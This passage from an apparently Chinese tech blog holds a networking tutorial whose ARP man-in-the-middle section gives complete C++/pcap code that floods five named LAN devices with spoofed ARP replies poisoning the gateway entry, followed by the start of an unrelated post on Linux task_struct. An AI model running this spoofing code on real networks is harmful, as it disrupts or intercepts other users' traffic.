title="ARP中间人攻击"></a>ARP中间人攻击</h3><p>​通过对上面的代码一些简单的修改，就能实现对网段内的所有设备进行依次询问（本网段从192.168.31.1到192.168.31.255的轮询），理论上就可以得到它们的IP及对应的MAC地址的响应包。当然由于这是我自家的路由器，也可以直接在浏览器输入192.168.31.1网关IP登录后台进行查看。将得到的结果记录下来，再构造一个 ARP reply包，就可以定向对某台设备进行ARP中间人攻击，代码如下，和上面的 ARP request代码很类似。具体代码如下，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push) <span class="comment">// 保持对齐方式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1)   <span class="comment">// 设定1位对齐</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击者ip及mac地址</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *srcip = <span class="string">&quot;192.168.31.50&quot;</span>;</span><br><span class="line">u_char SRC_MAC[<span class="number">6</span>] = &#123;<span class="number">0xC8</span>, <span class="number">0x58</span>, <span class="number">0xC0</span>, <span class="number">0xC1</span>, <span class="number">0x5B</span>, <span class="number">0xC9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击目标</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTACK_NUM 5</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *victimip[ATTACK_NUM] = &#123;<span class="string">&quot;192.168.31.145&quot;</span>,</span><br><span class="line"><span class="string">&quot;192.168.31.168&quot;</span>,</span><br><span class="line"><span class="string">&quot;192.168.31.233&quot;</span>,</span><br><span class="line"><span class="string">&quot;192.168.31.220&quot;</span>,</span><br><span class="line"><span class="string">&quot;192.168.31.188&quot;</span>&#125;;</span><br><span class="line">u_char VICTIM_MAC[ATTACK_NUM][<span class="number">6</span>] = &#123;</span><br><span class="line">&#123;<span class="number">0x96</span>, <span class="number">0x90</span>, <span class="number">0x29</span>, <span class="number">0xBB</span>, <span class="number">0xAF</span>, <span class="number">0x1C</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x40</span>, <span class="number">0xB6</span>, <span class="number">0xE7</span>, <span class="number">0xEF</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xE0</span>, <span class="number">0x1F</span>, <span class="number">0x88</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0xBC</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x98</span>, <span class="number">0x2F</span>, <span class="number">0x3C</span>, <span class="number">0xB2</span>, <span class="number">0x5B</span>, <span class="number">0xF1</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x9E</span>, <span class="number">0x78</span>, <span class="number">0xB7</span>, <span class="number">0x94</span>, <span class="number">0x6B</span>, <span class="number">0x29</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">string polluteip = <span class="string">&quot;192.168.31.&quot;</span>;</span><br><span class="line">u_char FAKE_MAC[<span class="number">6</span>] = &#123;<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_eth_header</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dst_mac[<span class="number">6</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> src_mac[<span class="number">6</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> type;</span><br><span class="line">&#125; ETH_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_arp_header</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hardware_type;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> protocol_type;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> hardware_len;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> protocol_len;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> option;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> src_mac[<span class="number">6</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> src_ip;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dst_mac[<span class="number">6</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> dst_ip;</span><br><span class="line">&#125; ARP_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_arp_packet</span></span><br><span class="line">&#123;</span><br><span class="line">ETH_HEADER eth_header;</span><br><span class="line">ARP_HEADER arp_header;</span><br><span class="line">&#125; ARP_PACKET;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitARPHeader</span><span class="params">(u_char *tmpBuf, <span class="type">int</span> ip_num, <span class="type">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ARP_HEADER arp_header;</span><br><span class="line"><span class="type">int</span> arpsize = <span class="built_in">sizeof</span>(ARP_HEADER);</span><br><span class="line"></span><br><span class="line">arp_header.hardware_type = <span class="built_in">htons</span>(<span class="number">0x0001</span>);</span><br><span class="line">arp_header.protocol_type = <span class="built_in">htons</span>(<span class="number">0x0800</span>);</span><br><span class="line">arp_header.hardware_len = <span class="number">6</span>;</span><br><span class="line">arp_header.protocol_len = <span class="number">4</span>;</span><br><span class="line">arp_header.option = <span class="built_in">htons</span>(<span class="number">0x0002</span>);</span><br><span class="line"></span><br><span class="line">string ret = polluteip + <span class="built_in">to_string</span>(ip_num);</span><br><span class="line">arp_header.src_ip = <span class="built_in">inet_addr</span>(ret.<span class="built_in">c_str</span>());</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">arp_header.src_mac[i] = FAKE_MAC[i];</span><br><span class="line">arp_header.dst_ip = <span class="built_in">inet_addr</span>(victimip[num]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">arp_header.dst_mac[i] = VICTIM_MAC[num][i];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">0</span>, &amp;arp_header.hardware_type, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">2</span>, &amp;arp_header.protocol_type, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">4</span>, &amp;arp_header.hardware_len, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">5</span>, &amp;arp_header.protocol_len, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">6</span>, &amp;arp_header.option, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">8</span>, &amp;arp_header.src_mac, <span class="number">6</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">14</span>, &amp;arp_header.src_ip, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">18</span>, &amp;arp_header.dst_mac, <span class="number">6</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">24</span>, &amp;arp_header.dst_ip, <span class="number">4</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">pcap_t</span> *fp;</span><br><span class="line"><span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">u_char packet[<span class="number">42</span>];</span><br><span class="line"><span class="type">pcap_if_t</span> *alldevs;</span><br><span class="line"><span class="type">pcap_if_t</span> *d;</span><br><span class="line"><span class="type">int</span> inum;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检测网卡 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pcap_findalldevs</span>(&amp;alldevs, errbuf) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Error in pcap_findalldevs: %s\n&quot;</span>, errbuf);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 打印网卡 */</span></span><br><span class="line"><span class="keyword">for</span> (d = alldevs; d; d = d-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d. %s&quot;</span>, ++i, d-&gt;name);</span><br><span class="line"><span class="keyword">if</span> (d-&gt;description)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; (%s)\n&quot;</span>, d-&gt;description);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; (No description available)\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNo interfaces found! Make sure WinPcap is installed.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the interface number (1-%d):&quot;</span>, i);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;inum);</span><br><span class="line"><span class="keyword">if</span> (inum &lt; <span class="number">1</span> || inum &gt; i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nInterface number out of range.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* 释放 */</span></span><br><span class="line"><span class="built_in">pcap_freealldevs</span>(alldevs);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 选择 */</span></span><br><span class="line"><span class="keyword">for</span> (d = alldevs, i = <span class="number">0</span>; i &lt; inum - <span class="number">1</span>; d = d-&gt;next, i++)</span><br><span class="line">;</span><br><span class="line"><span class="comment">/* 打开输出设备 */</span></span><br><span class="line"><span class="keyword">if</span> ((fp = <span class="built_in">pcap_open_live</span>(d-&gt;name, <span class="comment">// name of the device</span></span><br><span class="line"> <span class="number">65536</span>,  <span class="comment">// portion of the packet to capture.</span></span><br><span class="line"> <span class="comment">// 65536 grants that the whole packet will be captured on all the MACs.</span></span><br><span class="line"> <span class="number">1</span>,<span class="comment">// promiscuous mode (nonzero means promiscuous)</span></span><br><span class="line"> <span class="number">0</span>,<span class="comment">// read timeout</span></span><br><span class="line"> errbuf <span class="comment">// error buffer</span></span><br><span class="line"> )) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nUnable to open the adapter. %s is not supported by WinPcap\n&quot;</span>, d-&gt;name);</span><br><span class="line"><span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;open succeed!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">packet[i] = SRC_MAC[i - <span class="number">6</span>];</span><br><span class="line">packet[<span class="number">12</span>] = <span class="number">0x08</span>;</span><br><span class="line">packet[<span class="number">13</span>] = <span class="number">0x06</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 打印ARP包</span></span><br><span class="line"><span class="comment">for (int i = 0; i &lt; 42; i++)</span></span><br><span class="line"><span class="comment">cout &lt;&lt; hex &lt;&lt; (int)packet[i] &lt;&lt; &quot; &quot;;</span></span><br><span class="line"><span class="comment">cout &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">10000</span>; ++k)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">2</span>; j &lt; <span class="number">254</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> num = <span class="number">0</span>; num &lt; ATTACK_NUM; ++num)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">packet[i] = VICTIM_MAC[num][i];</span><br><span class="line"><span class="built_in">InitARPHeader</span>(packet + <span class="number">14</span>, <span class="number">1</span>, num);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pcap_sendpacket</span>(fp, (<span class="type">const</span> u_char *)&amp;packet, <span class="built_in">sizeof</span>(packet)) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nError sending the packet: %s\n&quot;</span>, <span class="built_in">pcap_geterr</span>(fp));</span><br><span class="line"><span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">usleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;send succeed %lld times!\n&quot;</span>, ++count);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​当然，ARP协议只用于局域网内的设备寻址，当两个路由器之间通信时，会采用基于LS或DV等算法的BGP（Border Gateway Protocol，边界网关协议），OSPF（Open Shortest Path First，开放最短路径优先协议）等进行通信，具体来说就是会根据数据包的目的IP地址决定从哪个端口转发出去，而不会直接使用到MAC地址作为路由。总结就是：<strong>MAC地址是局域网（LAN）层级的地址，在局域网内起作用；而IP地址和路由表用于跨越不同局域网的通信。</strong></p><p>​最后，ARP是基于IPv4的协议。在IPv6中，地址解析将由NDP（邻居发现协议，Neighbor Discovery Protocol）实现，它使用一系列IPv6控制信息报文（ICMPv6）来实现相邻节点（同一链路上的节点）的交互管理，并在一个子网中保持网络层地址和数据链路层地址之间的映射。邻居发现协议中定义了5种类型的信息：路由器宣告、路由器请求、路由重定向、邻居请求和邻居宣告。与ARP相比，NDP可以实现路由器发现、前缀发现、参数发现、地址自动配置、地址解析（代替ARP和RARP）、下一跳确定、邻居不可达检测、重复地址检测、重定向等更多功能。</p><hr><h2 id="踩坑补充"><a href="#踩坑补充" class="headerlink" title="踩坑补充"></a>踩坑补充</h2><ol><li>在抓包分析的过程中，发现通过pcap_sendpacket函数打出的ARP包的Ethernet层的Source字段以及ARP层的Sender MAC address字段并不是我自己写进去的值，而是被改成了物理机的MAC地址，目前还不清楚具体原因。<img src="https://s2.loli.net/2023/08/22/eiY6BXj1WQ8fc9b.png" alt="image.png"></li><li>代码中请注意取消内存对齐优化（上面代码里的第8，9行），详细可参考这篇文章：<a href="https://blog.csdn.net/Tomsidi/article/details/85710667">【C语言踩坑】PCAP发送ARP包之 – 多出的字节</a></li><li>理论上ARP请求应该是广播的，但从我抓包的结果来看，还发现了一些单播请求报文，如下图所示，它们是从我的网关路由器向我的设备发送过来的。这个看起来有点不符合常理，既然是单播，那就表明它知道我的MAC地址，事实上在报文帧首也确实有我的MAC地址（只不过这个地址确实是在Ethernet层而非在ARP层），至于为什么，我目前也还没有获得到比较好的答案。不过有一点，RFC标准文档和工业界的具体实现确实是可能存在一定的差异的，这可能与不同厂商的优化手段有关。<img src="https://s2.loli.net/2023/08/20/bV1ETDA7zn2P9mr.png" alt="image.png"></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Computer Networks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux进程线程源码浅析</title>
      <link href="/2023/07/05/O04_task_struct/"/>
      <url>/2023/07/05/O04_task_struct/</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习 Linux 分析与应用的过程中，最常被大家所提到的也就是：进程和线程。进程管理是所有操作系统的心脏，毫无疑问，这确实是一个很有意思的问题，值得我们去掌握。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>操作系统中，是用<strong>进程控制块</strong>（<em>process control block，PCB</em>）数据结构来描述进程的。也就是说：一个进程，我们可以将其看作是拥有一系列资源的一个个块。而这些资源的统一封装结构体便是：task_struct。在32位机器上，一个task_struct结构体大概有1.7KB大小，他能完整地描述一个正在执行的程序。</p><blockquote><p>在操作系统运行过程中，task_struct这些内核结构都是始终存在于内存里的，即使是操作系统时时刻刻都可能有磁盘与内存的数据换入换出，但是为保持系统稳定性，内核结构理论上是不会换出到磁盘里的。</p></blockquote><p>同样的，在Linux中一个线程也是用一个task_struct来表示，进程和线程的结构体类型没有任何区别，仅仅是其中的某些字段不一样而已，所有运行在系统中的进程&#x2F;线程都以 task_struct 的形式，并利用链表等多种数据结构组织于内核中。具体来说，在线程和进程创建时，clone() 系统调用通过传递的参数CLONE_THREAD flags不同，而选择使用不同的方式共享父进程&#x2F;父线程的资源，从而造成是新建了一个进程还是新建了一个线程的区别。</p><p>如果上述这段描述让你感到困惑，没关系，我们在后面会一步一步详细讲解。目前来说你可以简单地认为一个task_struct就对应一个线程，接下来让我们首先来看看 task_struct 结构体的一些主要字段。</p><h2 id="task-struct-主要字段解析"><a href="#task-struct-主要字段解析" class="headerlink" title="task_struct 主要字段解析"></a>task_struct 主要字段解析</h2><p>由于Linux每一个版本的源码并不完全相同，相关结构体和代码在迭代的过程中也逐渐变得复杂，因此我们这里是选取了最经典的一些字段作为分析和学习。</p><h4 id="1-进程唯一标识"><a href="#1-进程唯一标识" class="headerlink" title="1) 进程唯一标识"></a><strong>1) 进程唯一标识</strong></h4><p>进程标识有 pid 和 tgid 两个字段。在Linux系统中，例如下图中的main创建了三个子线程，我们之前提到每一个线程都是由一个task_struct所描述，因此下面这段程序实际上在内核中创建了4个task_struct结构体，分别是一个main主线程（我们记作t0）以及三个子线程（我们分别记作t1，t2，t3）。</p><p><strong>线程的实际线程号其实是 pid ，因此 pid 与线程是一一对应的关系</strong>，而一个线程组中所有的子线程和其主线程有相同的 tgid，而这个 tgid 也就是主线程（领头线程）的 pid。打个比方，在前面的例子里，可能t0，t1，t2，t3的tgid都是1000，而他们的pid分别是1000，1001，1002，1003。换句话说，tgid是从<strong>进程</strong>的视角来描述的，因为这四个线程统一存在于一个进程中，进程号便是1000；而pid则是从单个<strong>线程</strong>的角度来描述的，每一个pid也就对应内核中的一个具体的task_struct结构体，这也是调度的基本单位。</p><p><img src="https://s2.loli.net/2023/08/17/sgko9z2V5hdQqct.png" alt="image.png"></p><p>值得注意的是，我们通常所熟悉的 getpid() 系统调用返回的是其实是当前进程的 tgid 而不是pid值！也就是返回的其实是它的主线程的 pid。如果你需要获取该线程真正自己的 tgid，那么请使用 gettid() 方法！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> pid;<span class="comment">//进程的唯一标识</span></span><br><span class="line"><span class="type">pid_t</span> tgid;<span class="comment">// 线程组的主线程的pid成员的值</span></span><br></pre></td></tr></table></figure><h4 id="2）进程间的亲属关系"><a href="#2）进程间的亲属关系" class="headerlink" title="2）进程间的亲属关系"></a><strong>2）进程间的亲属关系</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">real_parent</span>;</span> <span class="comment">/* real parent process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">parent</span>;</span> <span class="comment">/* recipient of SIGCHLD, wait4() reports */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children</span>;</span>    <span class="comment">/* list of my children */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">sibling</span>;</span>    <span class="comment">/* linkage in my parent&#x27;s children list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">group_leader</span>;</span>    <span class="comment">/* threadgroup leader */</span></span><br></pre></td></tr></table></figure><p>在Linux系统中，所有进程之间都有着直接或间接地联系，每个进程都有其父进程（除了idle 0号进程），也可能有零个或多个子进程。拥有同一父进程的所有进程具有兄弟关系。</p><ul><li><p>real_parent 指向其父进程，如果创建它的父进程不再存在，则指向PID为1的init进程。</p></li><li><p>parent 指向其父进程，当它终止时，必须向它的父进程发送信号。它的值通常与 real_parent相同。</p></li><li><p>children表示链表的头部，链表中的所有元素都是它的子进程（进程的子进程链表）。</p></li><li><p>sibling表示进程的兄弟链表的节点。</p></li><li><p>group_leader指向其所在进程组的主进程。</p></li></ul><p><img src="https://s2.loli.net/2023/08/17/cCZumioGW864ALj.png" alt="image.png"></p><blockquote><p>Linux下有3个特殊的进程，idle进程(PID &#x3D; 0), init进程(PID &#x3D; 1)和kthreadd(PID &#x3D; 2)。</p><ol><li>idle进程其pid&#x3D;0，它是系统BIOS自检，导入MBR载入操作系统内核之后创建的第一个进程，也是唯一一个没有通过fork或者kernel_thread产生的进程。</li><li>init进程由idle通过kernel_thread创建，在内核空间完成初始化后, 加载init程序, 最终存在于用户空间当守护进程，并作为所有用户进程的父进程。</li><li>kthreadd进程由idle通过kernel_thread创建，并始终运行在内核空间, 负责所有内核线程的调度和管理。</li></ol></blockquote><h4 id="3）进程的状态"><a href="#3）进程的状态" class="headerlink" title="**3）进程的状态 **"></a>**3）进程的状态 **</h4><p>状态state通过设置比特位的方式来赋值，来表示进程的状态，它们在进程调度中有着很关键的作用，state的可能取值为以下一些宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">long</span> state；</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_RUNNING        0<span class="comment">//进程要么正在执行，要么准备执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_INTERRUPTIBLE  1 <span class="comment">//可中断的睡眠，可以通过一个信号唤醒</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_UNINTERRUPTIBLE    2 <span class="comment">//不可中断睡眠，不可以通过信号进行唤醒</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __TASK_STOPPED      4 <span class="comment">//进程停止执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __TASK_TRACED       8 <span class="comment">//进程被追踪</span></span></span><br><span class="line"><span class="comment">/* in tsk-&gt;exit_state */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXIT_ZOMBIE     16 <span class="comment">//僵尸状态的进程，表示进程被终止，但是父进程还没有获取它的终止信息，比如进程有没有执行完等信息。                     </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXIT_DEAD       32 <span class="comment">//进程的最终状态，进程死亡</span></span></span><br><span class="line"><span class="comment">/* in tsk-&gt;state again */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_DEAD       64 <span class="comment">//死亡</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_WAKEKILL       128 <span class="comment">//唤醒并杀死的进程</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_WAKING     256 <span class="comment">//唤醒进程</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/17/4IzuoQxqb3MpTGw.png" alt="image.png"></p><h4 id="4）进程内核栈"><a href="#4）进程内核栈" class="headerlink" 